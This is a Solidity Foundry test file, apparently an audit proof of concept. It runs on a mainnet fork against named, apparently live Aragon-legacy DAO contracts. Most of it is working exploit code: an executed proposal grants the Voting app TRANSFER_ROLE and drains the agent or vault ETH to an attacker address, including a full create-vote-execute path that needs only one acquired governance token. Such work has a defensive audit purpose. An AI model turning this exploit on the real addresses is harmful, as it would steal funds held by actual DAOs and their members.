// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IACL, IVoting, IAgent, ITokenManager, IMiniMeToken, Script} from "../src/AragonGov.sol";

/// Aragon-legacy governance — P7-01 (ZH4 pass 7, Tier-2 HIGH) fork PoC.
/// READ-ONLY mainnet; every state change happens on the local fork.
///
/// Claims reproduced:
///  1. The Voting app IS the ACL permission-manager for the holding app's TRANSFER_ROLE.
///  2. From the Voting app (i.e. from an executed proposal) `grantPermission` + `transfer`
///     drains the holding app's ETH — the pass-7 escalation, re-proven independently.
///  3. Full end-to-end proposal path (create -> vote -> execute) drains a funded vault once
///     the attacker holds the governance token (simulated post-AMM-listing acquisition).
///  4. Negative controls: the direct `transfer` reverts APP_AUTH_FAILED; a gated DAO cannot
///     even create a vote; the live governance tokens have no AMM pool.
contract AragonGovTest is Test {
    // DAO 1 — 2.90 ETH agent, Voting is TRANSFER_ROLE manager, TokenManager holds CREATE_VOTES_ROLE
    address constant DAO1   = 0x23B5db33e824822E8D98698C4929bE2ff1ba70e4;
    address constant ACL1   = 0xBe2f22F015C584De723e073Bd1b846d6baC2eF46;
    address constant VOT1   = 0x9970cC7eCd0758d4376223F38dD50E92Fb178270;
    address constant AG1    = 0xBcd768c566143714309Afe87Feb901DA7543F470;
    address constant TOK1   = 0xc5f98e8cd0b50D6522f5660784BfD1E500C63616;
    address constant TM1    = 0x92045D90d657A139042E4e12c3931B2180C71C5b;

    // DAO 2 — 0.70 ETH vault, ANY-open newVote, Voting is TRANSFER_ROLE manager
    address constant DAO2   = 0x3173B1691dE5BE1CB4be98AE895A8E5182C79b5A;
    address constant ACL2   = 0x2cc5C1c6C487935538931731d9bC0a0a521F185E;
    address constant VOT2   = 0x328B0b8c12E07cD8A7399438dB2DE64AD5E6DeBe;
    address constant VAULT2 = 0x86C5B626ba3DAb23F2A4EA68c219324629EE0A05;
    address constant TOK2   = 0x38a8474514Cc815258C43b127Ed5edAC6480e743;
    address constant TM2    = 0xA8a9dbfc07191aE35A0113825ad44500D17D56FA;

    // DAO 3 — 2.20 ETH vault, ANT token (liquid), minAQ=0, but NO TokenManager + EOA-gated creation
    address constant DAO3   = 0x2dE83b50Af29678774D5AbC4a7Cb2a588762f28C;
    address constant ACL3   = 0xA169A0FD710138b17ceE889e14a528BB2B637ea8;
    address constant VOT3   = 0xCFee4d3078F74197Ce77120DbfE6d35f443CAb1c;
    address constant VAULT3 = 0xAaCCCAFCd439bc9843568c11C6d37Ee0f66C9e69;

    // DAO 4 — 1.71 ETH agent, minAQ=0, TokenManager present  (the "closest" case: needs 1 token)
    address constant DAO4   = 0xf6b32eEe531A651DCa4aC81bA9aED06CcA2495C0;
    address constant ACL4   = 0x5f1A5002ffDB897f279489ea015033CDF9e5e70E;
    address constant VOT4   = 0x01BE3102f2482B4Aac6298dD81cD4f29fe670B81;
    address constant AG4    = 0x7EA598F29812673975334c1445AE5C9158b66cb8;
    address constant TOK4   = 0x9a3909d6c1dFA582297670914a25D9d0A0579854;
    address constant TM4    = 0x6694F20F82a74e76C3630621218267D3A5be2b3C;

    bytes32 constant TRANSFER_ROLE = keccak256("TRANSFER_ROLE");
    bytes32 constant CREATE_VOTES_ROLE = keccak256("CREATE_VOTES_ROLE");

    address attacker = makeAddr("attacker");

    function setUp() public {
        string memory url = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://eth.drpc.org")));
        vm.createSelectFork(url);
        console2.log("fork block", block.number);
    }

    // ------------------------------------------------------------------ 1
    function test_live_permission_manager_relationship() public view {
        assertEq(IACL(ACL1).getPermissionManager(AG1, TRANSFER_ROLE), VOT1, "DAO1 pm");
        assertEq(IACL(ACL2).getPermissionManager(VAULT2, TRANSFER_ROLE), VOT2, "DAO2 pm");
        assertEq(IACL(ACL3).getPermissionManager(VAULT3, TRANSFER_ROLE), VOT3, "DAO3 pm");
        assertEq(IACL(ACL4).getPermissionManager(AG4, TRANSFER_ROLE), VOT4, "DAO4 pm");
        // pre-escalation: the Voting app does NOT hold the role yet
        assertFalse(IACL(ACL1).hasPermission(VOT1, AG1, TRANSFER_ROLE, ""), "DAO1 pre");
        assertFalse(IACL(ACL2).hasPermission(VOT2, VAULT2, TRANSFER_ROLE, ""), "DAO2 pre");
        // and no ANY_ENTITY holds it
        assertFalse(IACL(ACL1).hasPermission(address(0xff), AG1, TRANSFER_ROLE, ""), "DAO1 any");
    }

    // ------------------------------------------------------------------ 2
    /// The pass-7 escalation, re-proven: an executed proposal runs *as* the Voting app.
    function test_acl_escalation_impersonated_proposal() public {
        uint256 before = attacker.balance;
        uint256 agentBefore = AG1.balance;
        assertGt(agentBefore, 2 ether, "agent funded");

        // execute (as Voting) grantPermission(voting, agent, TRANSFER_ROLE)
        vm.prank(VOT1);
        IACL(ACL1).grantPermission(VOT1, AG1, TRANSFER_ROLE);
        assertTrue(IACL(ACL1).hasPermission(VOT1, AG1, TRANSFER_ROLE, ""), "granted");

        // execute (as Voting) agent.transfer(ETH, attacker, 2 ether)
        vm.prank(VOT1);
        IAgent(AG1).transfer(address(0), attacker, 2 ether);

        assertEq(attacker.balance, before + 2 ether, "attacker +2 ETH");
        assertEq(AG1.balance, agentBefore - 2 ether, "agent -2 ETH");
        console2.log("drained ETH", attacker.balance - before);
    }

    // ------------------------------------------------------------------ 3
    /// Full proposal path on a funded, ANY-open DAO. Token acquisition is simulated
    /// (post-AMM-listing world) by minting the governance token from its controller.
    function test_full_proposal_path_any_open_vault() public {
        assertTrue(IVoting(VOT2).canForward(attacker, ""), "ANY-open newVote");
        assertEq(IMiniMeToken(TOK2).controller(), TM2, "token controller == TokenManager");

        // --- simulate acquisition: attacker gets >5% of supply at block N-1 ---
        vm.prank(TM2);
        IMiniMeToken(TOK2).generateTokens(attacker, 5e18);
        vm.roll(block.number + 1); // vote snapshot = block.number - 1

        uint256 vaultBal = VAULT2.balance;
        uint256 before = attacker.balance;
        assertGt(vaultBal, 0, "vault funded");

        bytes memory proposal = Script.encodeCalls(
            _addrs(ACL2, VAULT2),
            _datas(
                abi.encodeWithSelector(IACL.grantPermission.selector, VOT2, VAULT2, TRANSFER_ROLE),
                abi.encodeWithSelector(IAgent.transfer.selector, address(0), attacker, vaultBal)
            )
        );

        vm.prank(attacker);
        uint256 id = IVoting(VOT2).newVote(proposal, "P7-01 PoC");
        vm.prank(attacker);
        IVoting(VOT2).vote(id, true, false);

        vm.warp(block.timestamp + IVoting(VOT2).voteTime() + 1);
        IVoting(VOT2).executeVote(id); // permissionless

        assertEq(VAULT2.balance, 0, "vault drained");
        assertEq(attacker.balance, before + vaultBal, "attacker received vault");
        console2.log("drained vault ETH", vaultBal);
    }

    // ------------------------------------------------------------------ 4
    function test_negative_direct_transfer_reverts() public {
        vm.prank(attacker);
        vm.expectRevert("APP_AUTH_FAILED");
        IAgent(AG1).transfer(address(0), attacker, 1 ether);
    }

    function test_negative_newVote_gated_ant_dao() public {
        // DAO3 has no TokenManager app and CREATE_VOTES_ROLE is EOA-managed
        assertEq(IACL(ACL3).getPermissionManager(VOT3, CREATE_VOTES_ROLE), 0xcafE1A77e84698c83CA8931F54A755176eF75f2C);
        vm.prank(attacker);
        vm.expectRevert("APP_AUTH_FAILED");
        IVoting(VOT3).newVote(hex"00000001", "x");
    }

    // ------------------------------------------------------------------ 5
    /// "Closest" case: minAQ = 0 and a TokenManager -> a single governance token is enough.
    /// Gate is purely token acquisition (the token has no AMM pool today).
    function test_closest_conditional_minAQ0_tokenmanager() public {
        assertEq(IVoting(VOT4).minAcceptQuorumPct(), 0, "minAQ 0");
        assertEq(IMiniMeToken(TOK4).totalSupply(), 2, "supply 2");
        assertEq(IMiniMeToken(TOK4).controller(), TM4, "controller == TokenManager");
        assertTrue(
            IACL(ACL4).hasPermission(TM4, VOT4, CREATE_VOTES_ROLE, ""),
            "TokenManager holds CREATE_VOTES_ROLE"
        );
        // no Uniswap V2 pair today (the live trigger is an AMM listing)
        address pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(TOK4, WETH);
        assertEq(pair, address(0), "no Uniswap V2 pool");

        // simulate the listing: attacker acquires 1 token at block N-1
        vm.prank(TM4);
        IMiniMeToken(TOK4).generateTokens(attacker, 1);
        vm.roll(block.number + 1);

        uint256 agentBal = AG4.balance;
        uint256 before = attacker.balance;
        assertGt(agentBal, 0, "agent funded");

        bytes memory proposal = Script.encodeCalls(
            _addrs(ACL4, AG4),
            _datas(
                abi.encodeWithSelector(IACL.grantPermission.selector, VOT4, AG4, TRANSFER_ROLE),
                abi.encodeWithSelector(IAgent.transfer.selector, address(0), attacker, agentBal)
            )
        );
        // token holder creates the vote through the TokenManager (holder-gated forward)
        bytes memory inner = Script.encodeCalls(
            _addr1(VOT4),
            _data1(abi.encodeWithSelector(IVoting.newVote.selector, proposal, ""))
        );
        vm.prank(attacker);
        ITokenManager(TM4).forward(inner);

        uint256 id = IVoting(VOT4).votesLength() - 1;
        vm.prank(attacker);
        IVoting(VOT4).vote(id, true, false);
        vm.warp(block.timestamp + IVoting(VOT4).voteTime() + 1);
        IVoting(VOT4).executeVote(id);

        assertEq(AG4.balance, 0, "agent drained");
        assertEq(attacker.balance, before + agentBal, "attacker received agent ETH");
        console2.log("drained agent ETH", agentBal);
    }

    // helpers
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function _addrs(address a, address b) internal pure returns (address[] memory arr) {
        arr = new address[](2);
        arr[0] = a;
        arr[1] = b;
    }

    function _datas(bytes memory a, bytes memory b) internal pure returns (bytes[] memory arr) {
        arr = new bytes[](2);
        arr[0] = a;
        arr[1] = b;
    }

    function _addr1(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }

    function _data1(bytes memory a) internal pure returns (bytes[] memory arr) {
        arr = new bytes[](1);
        arr[0] = a;
    }
}

interface IUniswapV2Factory {
    function getPair(address, address) external view returns (address);
}
